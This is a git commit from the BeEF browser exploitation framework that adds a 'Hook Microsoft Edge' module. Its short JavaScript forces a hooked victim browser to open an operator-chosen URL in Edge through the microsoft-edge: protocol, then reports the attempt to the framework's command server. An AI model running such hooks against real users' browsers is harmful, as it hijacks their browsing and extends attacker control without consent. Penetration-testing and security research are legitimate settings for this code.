b0732f21e6bb258ca2d6bf9b3dc1d34ec1330eb1
Brendan Coles <bcoles@gmail.com>
2019-07-20 15:55:09 +0000

    Add Hook Microsoft Edge module

---
+++ modules/host/hook_microsoft_edge/command.js
@@ -0,0 +1,12 @@
+//
+// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+beef.execute(function() {
+	var edge_url = "<%== @url %>";
+	window.location = 'microsoft-edge:' + edge_url;
+  beef.debug("Attempted to open " + edge_url + " in Microsoft Edge.");
+  beef.net.send('<%= @command_url %>', <%= @command_id %>, "Attempted to open " + edge_url + " in Microsoft Edge.");
+});
